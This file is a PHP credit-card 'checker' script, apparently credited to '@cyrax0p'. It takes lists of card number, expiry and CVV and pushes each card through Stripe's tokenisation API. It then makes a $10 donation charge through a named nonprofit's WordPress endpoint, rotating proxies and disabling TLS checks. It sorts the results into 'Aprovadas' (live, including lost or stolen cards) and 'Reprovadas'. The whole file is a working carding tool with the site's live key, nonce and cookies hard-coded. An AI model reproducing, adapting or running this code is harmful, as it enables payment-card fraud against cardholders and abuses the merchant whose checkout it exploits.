<?php

//Base edited by @cyrax0p
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function proxy()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = proxy();


////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];




///////////////=[1st REQ]=/////////////////

$ch = curl_init();
//(ur proxy function)
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  
   'Host: api.stripe.com',
  'accept: application/json',
  'Origin: https://js.stripe.com',
  'Referer: https://js.stripe.com/v3/controller-d4f74feec79929c648e18fe835cd0433.html',
  'content-type: application/x-www-form-urlencoded',
  'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'
   ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Jose+Pala&billing_details[email]=kazrllllz79%40gmail.com&billing_details[phone]=%2B1+09454681348&billing_details[address][line1]=Street+8162+Ave+Lane&billing_details[address][city]=New+York&billing_details[address][state]=New+York&billing_details[address][postal_code]=10102&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F77ea1694%3B+stripe-js-v3%2F77ea1694&time_on_page=40672&referrer=https%3A%2F%2Fneweagle.net%2Fpayments%2F&key=pk_live_fmmxQYa7QBUlqUq2CVICdHYN');
$result1 = curl_exec($ch);
  $id = trim(strip_tags(getStr($result1,'"id": "','"')));

//////////////=[2nd Req]=//////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'origin: https://js.stripe.com',
'Referer: https://js.stripe.com/v3/controller-d4f74feec79929c648e18fe835cd0433.html',
'accept: application/json',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
  'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'
   ));
curl_setopt($ch, CURLOPT_POSTFIELDS,'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]=10102&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F77ea1694%3B+stripe-js-v3%2F77ea1694&time_on_page=50848&referrer=https%3A%2F%2Fneweagle.net%2Fpayments%2F&key=pk_live_fmmxQYa7QBUlqUq2CVICdHYN');
  $result2 = curl_exec($ch);
 $message = trim(strip_tags(getstr($result2,'"message":"','"')));
$token = trim(strip_tags(getstr($result2,'"id": "','"')));

/////////////////=[3Req]=//////////////////


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://neweagle.net/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//'Host: ',
'origin: https://neweagle.net',
'Referer: https://neweagle.net/payments/',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'accept: */*',
'Cookie: __cfduid=d71938ebc130e13af805da97bac290a831600619563;_ga=GA1.2.417177186.1600619512;_hjid=bfb72589-9684-41c2-91fe-64f2430333a6;hubspotutk=2c33e7ee1313bf2b1387a8fbf1d1f813;_gid=GA1.2.1752382167.1601620297;_gat_UA-107845868-1=1;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=1;__hstc=223079940.2c33e7ee1313bf2b1387a8fbf1d1f813.1600619532391.1600619532391.1601620301644.2;__hssrc=1;__hssc=223079940.1.1601620301644',
 //'X-Requested-With: XMLHttpRequest',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'
   ));


curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=ds_process_button&stripeToken='.$token.'&paymentMethodID='.$id.'&allData%5BbillingDetails%5D%5Bname%5D=Jose+Pala&allData%5BbillingDetails%5D%5Bemail%5D=kazrllllz79%40gmail.com&allData%5BbillingDetails%5D%5Bphone%5D=%2B1+09454681348&allData%5BbillingDetails%5D%5Baddress%5D%5Bline1%5D=Street+8162+Ave+Lane&allData%5BbillingDetails%5D%5Baddress%5D%5Bcity%5D=New+York&allData%5BbillingDetails%5D%5Baddress%5D%5Bstate%5D=New+York&allData%5BbillingDetails%5D%5Baddress%5D%5Bpostal_code%5D=10028&allData%5BbillingDetails%5D%5Baddress%5D%5Bcountry%5D=US&allData%5BshippingDetails%5D%5Bname%5D=&allData%5BshippingDetails%5D%5Bphone%5D=&allData%5BshippingDetails%5D%5Bline1%5D=&allData%5BshippingDetails%5D%5Bcity%5D=&allData%5BshippingDetails%5D%5Bstate%5D=&allData%5BshippingDetails%5D%5Bpostal_code%5D=&allData%5BshippingDetails%5D%5Bcountry%5D=&type=donation&amount=10&params%5Bvalue%5D=ds1559096581012&params%5Bname%5D=Company+Name&params%5Bamount%5D=MTAwMA%3D%3D&params%5Boriginal_amount%5D=10&params%5Bdescription%5D=Description&params%5Bpanellabel%5D=Confirm+payment&params%5Btype%5D=donation&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=&params%5Bcapture%5D=1&params%5Bdisplay_amount%5D=&params%5Bcurrency%5D=USD&params%5Blocale%5D=auto&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=&params%5Berror_url%5D=&params%5Bbutton_id%5D=ds1559096581012&params%5Bcustom_role%5D=&params%5Bbilling%5D=1&params%5Bshipping%5D=1&params%5Brememberme%5D=&params%5Bkey%5D=pk_live_fmmxQYa7QBUlqUq2CVICdHYN&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Fneweagle.net%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=&params%5Binstance%5D=ds1559096581012&params%5Bds_nonce%5D=1f7685043a&ds_nonce=1f7685043a');



 $result3 = curl_exec($ch);
 $message = trim(strip_tags(getstr($result3,'"message":"','"')));
 
/////////// [Bin Lookup Api] /////////////

$cctwo = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];
//$base= $cyrax0p

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}



//////depending upon  request reponse you have to use that message in results
//// like some sites cards decline in 1st reponse  so result1= message
/// some sites sometimes gives incorrect cvc in 2nd and 3rd response so i use both result2 and result 3 = incorrect cvc = ccn
 /// and sometimes 2nd reposponse gives cvc_checked= pass but decline in 3rd response .. result2= cvv if cvc_check = pass
      
      
/////////////////[Responses]///////////////

if(strpos($result3, '/donations/thank_you?donation_number=','' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check":"pass",')){
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV)_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "Thank You For Donation." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) CYRAX  </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "Thank You." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) CYRAX  </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"status": "succeeded"')){
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV)_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card zip code is incorrect.' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV - Incorrect Zip)_ CYRAX  </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "incorrect_zip" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV - Incorrect Zip_ CYRAX  )」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "Success" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV)_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "succeeded." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV)_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"fraudulent")){
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Fraudulent Card_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Fraudulent Card_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Insufficient Funds_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "insufficient_funds")) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Insufficient Funds_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "lost_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Lost Card_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "stolen_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Stolen Card_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'security code is incorrect.' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CCN)_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CCN)_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
     }
elseif(strpos($result2, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CCN)_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'security code is invalid.' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CCN)_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CCN)_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost)_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Expired Card_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "expired_card" )) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Expired Card_ CYRAX  </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved  CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "pickup_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost)_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Expired Card_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "expired_card" )) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Expired Card_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, 'Your card number is incorrect.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Incorrect Card Number_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "incorrect_number")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Incorrect Card Number_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result1, "do_not_honor")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Do_Not_Honor_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Declined_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Declined_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Declined_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result2, "generic_decline")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Generic_Decline_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Check : Unavailable_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Fail_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"parameter_invalid_empty")){
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Missing Card Details_ CYRAX  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif (strpos($result2,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Doesnt Support Purchase_ CYRAX  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"transaction_not_allowed")){
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Doesnt Support Purchase CYRAX  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,"three_d_secure_redirect")){
     echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Doesnt Support Purchase_ CYRAX  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Card is declined by your bank, please contact them for additional information.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「3D Secure Redirect_ CYRAX  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"missing_payment_information")){
     '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Missing Payment Informations_ CYRAX  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "Payment cannot be processed, missing credit card number")) {
     '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Missing Credit Card Number CYRAX  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
else {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Dead Proxy/Error Not listed CYRAX  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

//echo $result3;

?>